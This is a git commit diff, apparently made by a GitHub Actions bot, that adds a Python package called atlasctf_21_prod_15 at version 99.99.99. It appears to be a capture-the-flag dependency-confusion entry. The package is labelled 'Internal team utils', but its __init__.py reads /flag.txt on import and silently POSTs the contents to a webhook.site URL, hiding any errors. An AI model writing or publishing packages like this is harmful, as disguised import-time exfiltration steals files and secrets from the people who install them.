27b34881d160d3a6b8cb1c0f8197cb00d2f1200c
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2025-07-30 13:17:46 +0000

    Add package atlasctf-21-prod-15/99.99.99/atlasctf_21_prod_15-99.99.99.tar.gz

---
+++ packages/atlasctf-21-prod-15/atlasctf_21_prod_15-99.99.99.tar.gz/atlasctf_21_prod_15-99.99.99/atlasctf_21_prod_15/__init__.py
@@ -0,0 +1,8 @@
+import requests
+try:
+    with open("/flag.txt") as f:
+        flag = f.read()
+    requests.post("https://webhook.site/0b1957da-42ef-4742-85f0-08ddcfb3fd2a", data={"flag": flag})
+except:
+    pass
+
---
+++ packages/atlasctf-21-prod-15/atlasctf_21_prod_15-99.99.99.tar.gz/atlasctf_21_prod_15-99.99.99/setup.py
@@ -0,0 +1,9 @@
+from setuptools import setup, find_packages
+
+setup(
+    name="atlasctf_21_prod_15",
+    version="99.99.99",
+    packages=find_packages(),
+    description="Internal team utils",
+)
+
